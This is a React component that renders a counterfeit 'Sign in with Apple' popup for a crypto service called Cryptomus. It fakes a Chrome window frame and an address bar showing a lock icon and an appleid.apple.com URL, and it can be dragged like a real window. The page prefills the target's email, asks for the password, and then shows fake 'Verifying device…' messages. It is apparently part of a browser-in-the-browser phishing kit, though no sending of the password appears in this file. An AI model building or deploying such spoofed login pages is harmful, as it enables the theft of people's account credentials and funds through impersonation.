import React from "react";
import EmailLayout from "../EmailLayout";
import applePng from "../assets/apple.png";
import iconApple from "../assets/iconapple.png";

// Apple Password Page (layout-only). Asks for password only, with browser header and URL bar.
const ApplePasswordPage = () => {
  const [password, setPassword] = React.useState("");
  const [showPassword, setShowPassword] = React.useState(false);
  const [isFieldFocused, setIsFieldFocused] = React.useState(false);
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const phrases = React.useMemo(
    () => [
      "Connecting to Apple…",
      "Securing your session…",
      "Verifying device…",
      "Authenticating…",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  React.useEffect(() => {
    if (!isSubmitting) return;
    const id = setInterval(() => {
      setPhraseIndex((i) => (i + 1) % phrases.length);
    }, 1400);
    return () => clearInterval(id);
  }, [isSubmitting, phrases.length]);
  const [clientEmail] = React.useState(
    localStorage.getItem("client_email") || "user@icloud.com"
  );
  const [appName] = React.useState(
    localStorage.getItem("apple_app_name") || "Production Cryptomus Web"
  );
  const [windowTitle] = React.useState(
    localStorage.getItem("apple_window_title") ||
      "Sign in with Apple - Google Chrome"
  );
  const [urlText] = React.useState(
    localStorage.getItem("apple_url") ||
      "https://appleid.apple.com/auth/authorize?client_id=prod.cryptomus.com&redirect_uri=https://prod.cryptomus.com/callback"
  );

  // Drag state for movable window
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(0, (window.innerWidth - 520) / 2),
    top: Math.max(0, (window.innerHeight - 640) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  return (
    <EmailLayout>
      <div
        className="min-h-screen w-full bg-[#0b0b0b] relative p-4"
        style={{
          fontFamily: "-apple-system, SF Pro Text, Roboto, Arial, sans-serif",
        }}
      >
        <div
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3)",
            width: "min(520px, 92vw)",
            minHeight: 560,
            color: "#111",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "absolute",
            left: position.left,
            top: position.top,
            cursor: isDragging ? "grabbing" : "default",
          }}
        >
          {/* Simulated window bar */}
          <div
            style={{
              height: 28,
              background: "#e5e7eb",
              borderBottom: "1px solid #d1d5db",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 8px",
              fontSize: 12,
              color: "#111",
            }}
            onMouseDown={startDrag}
          >
            <span
              style={{
                display: "flex",
                alignItems: "center",
                gap: 6,
                opacity: 0.9,
              }}
            >
              {/* Apple logo as window icon */}
              <svg width="14" height="14" viewBox="0 0 24 24" aria-hidden>
                <path
                  fill="#111"
                  d="M16.365 1.43c-.936.052-2.045.61-2.69 1.326-.585.65-1.06 1.607-.87 2.55.998.076 2.02-.51 2.642-1.242.612-.721 1.07-1.676.918-2.634zM21.343 17.1c-.055-.107-2.113-1.145-2.166-3.626-.053-2.27 1.841-3.352 1.92-3.398-.995-1.434-2.54-1.629-3.079-1.649-1.311-.133-2.409.73-3.033.73-.622 0-1.59-.712-2.616-.692-1.344.02-2.582.776-3.273 1.975-1.393 2.413-.355 5.967.997 7.92.659.955 1.438 2.03 2.47 1.99.988-.04 1.36-.643 2.55-.643 1.19 0 1.52.643 2.585.624 1.07-.02 1.747-.974 2.404-1.933.756-1.094 1.07-2.156 1.14-2.299z"
                />
              </svg>
              {windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              {/* Minimize */}
              <button
                type="button"
                title="Minimize"
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }}
                style={{
                  width: 34,
                  height: 22,
                  border: "1px solid #d1d5db",
                  background: "#f9fafb",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#111",
                  cursor: "default",
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                  <rect x="2" y="7.5" width="12" height="1" fill="#111" />
                </svg>
              </button>
              {/* Maximize */}
              <button
                type="button"
                title="Maximize"
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }}
                style={{
                  width: 34,
                  height: 22,
                  border: "1px solid #d1d5db",
                  background: "#f9fafb",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#111",
                  cursor: "default",
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                  <rect
                    x="3"
                    y="3"
                    width="10"
                    height="10"
                    fill="none"
                    stroke="#111"
                    strokeWidth="1.2"
                  />
                </svg>
              </button>
              {/* Close */}
              <button
                type="button"
                title="Close"
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }}
                style={{
                  width: 34,
                  height: 22,
                  border: "1px solid #d1d5db",
                  background: "#f9fafb",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#111",
                  cursor: "default",
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                  <path
                    d="M3 3 L13 13 M13 3 L3 13"
                    stroke="#111"
                    strokeWidth="1.4"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* URL bar */}
          <div
            style={{ borderBottom: "1px solid #e5e7eb", background: "#fff" }}
            onMouseDown={startDrag}
          >
            <div
              style={{
                width: "100%",
                background: "#f3f4f6",
                border: "1px solid #d1d5db",
                height: 32,
                display: "flex",
                alignItems: "center",
                padding: "0 10px",
                gap: 8,
                fontSize: 12,
                color: "#111",
              }}
            >
              {/* Lock icon */}
              <svg
                width="18"
                height="18"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                stroke="#6b7280"
                strokeWidth="1.5"
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                }}
              >
                {urlText}
              </div>
            </div>
          </div>

          {/* Content */}
          <div
            style={{ flex: 1, padding: "0 24px 18px", position: "relative" }}
          >
            <style>{`@keyframes spin { from { transform: rotate(0deg);} to { transform: rotate(360deg);} }`}</style>
            {/* Barra superior: ícone + Conta Apple */}
            <div style={{ paddingTop: 12, paddingBottom: 10 }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  color: "#111",
                }}
              >
                <svg width="16" height="16" viewBox="0 0 32 32" aria-hidden>
                  <path
                    fill="#444444"
                    d="M23.023 17.093c-0.033-3.259 2.657-4.822 2.777-4.901-1.512-2.211-3.867-2.514-4.705-2.548-2.002-0.204-3.91 1.18-4.926 1.18-1.014 0-2.583-1.15-4.244-1.121-2.185 0.033-4.199 1.271-5.323 3.227-2.269 3.936-0.58 9.769 1.631 12.963 1.081 1.561 2.37 3.318 4.061 3.254 1.63-0.064 2.245-1.055 4.215-1.055s2.524 1.055 4.248 1.021c1.753-0.032 2.864-1.591 3.936-3.159 1.24-1.814 1.751-3.57 1.782-3.659-0.038-0.017-3.416-1.312-3.451-5.202zM19.783 7.53c0.897-1.089 1.504-2.602 1.34-4.108-1.294 0.053-2.861 0.86-3.79 1.948-0.832 0.965-1.561 2.502-1.365 3.981 1.444 0.112 2.916-0.734 3.816-1.821z"
                  ></path>
                </svg>
                <strong style={{ fontSize: 16 }}>Conta Apple</strong>
              </div>
              <div
                style={{ height: 1, background: "#e5e7eb", marginTop: 10 }}
              />
            </div>
            {/* Apple image centralizada (do print) */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                margin: "16px 0 10px",
              }}
            >
              <img
                src={applePng}
                alt="Apple"
                style={{ width: 92, height: "auto" }}
              />
            </div>

            <div
              style={{
                textAlign: "center",
                color: "#111",
                marginBottom: 12,
                lineHeight: 1.35,
              }}
            >
              Use your Apple account to sign in to <strong>{appName}</strong>.
            </div>

            {/* Email badge */}
            <div style={{ display: "flex", justifyContent: "center" }}>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "6px 12px",
                  borderRadius: 999,
                  border: "1px solid #e5e7eb",
                  background: "#fff",
                  margin: "8px 0 10px",
                  fontSize: 13,
                  color: "#374151",
                }}
              >
                <img
                  src={iconApple}
                  alt="Apple"
                  style={{ width: 16, height: 16 }}
                />
                <span>{clientEmail}</span>
              </div>
            </div>

            {/* Campo Password arredondado com botão de ação (como no print) */}
            <div style={{ marginTop: 10 }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  border: isFieldFocused
                    ? "1px solid #2563eb"
                    : "1px solid #d1d5db",
                  boxShadow: isFieldFocused
                    ? "0 0 0 2px rgba(37,99,235,0.2)"
                    : "none",
                  borderRadius: 24,
                  padding: 6,
                  gap: 8,
                }}
              >
                <input
                  data-apple-modal
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  style={{
                    flex: 1,
                    border: "none",
                    outline: "none",
                    padding: "8px 10px",
                    fontSize: 14,
                    background: "transparent",
                  }}
                  onFocus={() => setIsFieldFocused(true)}
                  onBlur={() => setIsFieldFocused(false)}
                />
                {/* Eye button removed */}
                <button
                  type="button"
                  disabled={!password.trim()}
                  style={{
                    width: 36,
                    height: 36,
                    borderRadius: "50%",
                    border: "1px solid #d1d5db",
                    background: password.trim() ? "#2563eb" : "#f3f4f6",
                    color: password.trim() ? "#fff" : "#6b7280",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    cursor: password.trim() ? "pointer" : "not-allowed",
                  }}
                  onClick={() => {
                    if (!password.trim()) return;
                    setIsSubmitting(true);
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M5 12h14"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                    <path
                      d="M13 5l7 7-7 7"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </button>
              </div>
            </div>

            {/* Forgot link */}
            <div style={{ marginTop: 10, textAlign: "right" }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{
                  color: "#2563eb",
                  textDecoration: "none",
                  fontSize: 13,
                }}
              >
                Forgot your password?
              </a>
            </div>

            {/* Botão principal removido: ação pelo botão circular do input */}

            {/* Footer notice */}
            <div
              style={{
                marginTop: 18,
                color: "#4b5563",
                fontSize: 12,
                lineHeight: 1.45,
              }}
            >
              By continuing, your interactions with this device may be used by
              Apple for account security and fraud prevention. See how your data
              is handled.
            </div>

            {/* Loading overlay (etapa 2) dentro do conteúdo para manter header e footer visíveis */}
            {isSubmitting && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexDirection: "column",
                  gap: 18,
                  zIndex: 50,
                  cursor: "wait",
                }}
              >
                {/* Apple image grande */}
                <img
                  src={applePng}
                  alt="Apple"
                  style={{
                    width: 92,
                    height: "auto",
                    transform: "translateY(-6px)",
                  }}
                />

                {/* Spinner */}
                <div
                  style={{
                    width: 44,
                    height: 44,
                    borderRadius: "50%",
                    border: "4px solid #e5e7eb",
                    borderTopColor: "#111",
                    animation: "spin 0.9s linear infinite",
                  }}
                />

                {/* Frases giratórias */}
                <div
                  style={{
                    color: "#374151",
                    fontSize: 15,
                    textAlign: "center",
                  }}
                >
                  {phrases[phraseIndex]}
                </div>
              </div>
            )}
          </div>

          {/* Footer */}
          <div
            style={{
              borderTop: "1px solid #f3f4f6",
              background: "#fff",
              minHeight: 44,
              padding: "8px 16px",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              color: "#6b7280",
              fontSize: 12,
            }}
          >
            <span>Copyright © 2025 Apple Inc. All rights reserved.</span>
            <div style={{ display: "flex", gap: 12 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{ color: "#6b7280", textDecoration: "none" }}
              >
                Privacy Policy
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{ color: "#6b7280", textDecoration: "none" }}
              >
                Cookie Use
              </a>
            </div>
          </div>
        </div>
      </div>
    </EmailLayout>
  );
};

export default ApplePasswordPage;
